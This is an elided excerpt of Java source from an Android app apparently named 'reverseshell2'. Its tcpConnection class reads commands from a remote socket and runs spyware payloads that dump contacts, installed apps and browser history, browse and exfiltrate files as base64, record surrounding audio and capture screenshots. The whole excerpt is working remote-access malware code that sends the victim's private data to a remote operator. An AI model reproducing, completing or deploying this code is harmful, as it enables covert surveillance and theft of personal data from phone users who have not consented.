...
import com.example.reverseshell2.Payloads.ContactsDumper;
import com.example.reverseshell2.Payloads.BrowserHistoryDumper;
import com.example.reverseshell2.Payloads.FileManager;
import com.example.reverseshell2.Payloads.SurroundRecorder;
import com.example.reverseshell2.Payloads.ScreenCapture;
import com.example.reverseshell2.Payloads.NotificationSpy;
...
public class tcpConnection extends AsyncTask<String,Void,Void> {
    ...
    ContactsDumper contactsDumper;
    BrowserHistoryDumper browserHistoryDumper;
    SurroundRecorder surroundRecorder;
    ...
    public tcpConnection(Activity activity, Context context) {
        ...
        contactsDumper = new ContactsDumper(context);
        browserHistoryDumper = new BrowserHistoryDumper(context);
        surroundRecorder = new SurroundRecorder(context);
    }
...
//                    audioManager.stopRecording(out);
                ...
                {
                    String contacts = contactsDumper.dumpAllContacts();
                    out.write(contacts.getBytes("UTF-8"));
                    out.write("END123\n".getBytes("UTF-8"));
                }
                else if(line.equals("getApps"))
                {
                    String apps = browserHistoryDumper.dumpInstalledApps();
                    out.write(apps.getBytes("UTF-8"));
                    out.write("END123\n".getBytes("UTF-8"));
                }
                else if(line.startsWith("fileBrowse"))
                {
                    String path = line.length() > 11 ? line.substring(11).trim() : "/";
                    String listing = FileManager.listDirectory(path);
                    out.write(listing.getBytes("UTF-8"));
                    out.write("END123\n".getBytes("UTF-8"));
                }
                else if(line.startsWith("fileDownload "))
                {
                    String filePath = line.substring(13).trim();
                    String fileData = FileManager.readFileAsBase64(filePath);
                    out.write("fileDownload\n".getBytes("UTF-8"));
                    out.write(fileData.getBytes("UTF-8"));
                    out.write("\nEND123\n".getBytes("UTF-8"));
                }
                else if(line.equals("storageInfo"))
                {
                    String info = FileManager.getDeviceStorageInfo();
                ...
                {
                    String result = surroundRecorder.startRecording();
                    out.write((result + "\n").getBytes("UTF-8"));
                }
                else if(line.equals("stopSurround"))
                {
                    out.write("surroundAudio\n".getBytes("UTF-8"));
                    String audioData = surroundRecorder.stopRecording();
                    out.write(audioData.getBytes("UTF-8"));
                    out.write("\nEND123\n".getBytes("UTF-8"));
                }
                else if(line.equals("screenshot"))
                {
                    out.write("screenshot\n".getBytes("UTF-8"));
                    String screenshotData = ScreenCapture.takeScreenshot(context);
                    out.write(screenshotData.getBytes("UTF-8"));
                    out.write("\nEND123\n".getBytes("UTF-8"));
                }
                else if(line.equals("getBrowserHistory"))
                {
                    String history = browserHistoryDumper.dumpBrowserHistory();
                    out.write(history.getBytes("UTF-8"));
                    out.write("END123\n".getBytes("UTF-8"));
                }
                else
                    {
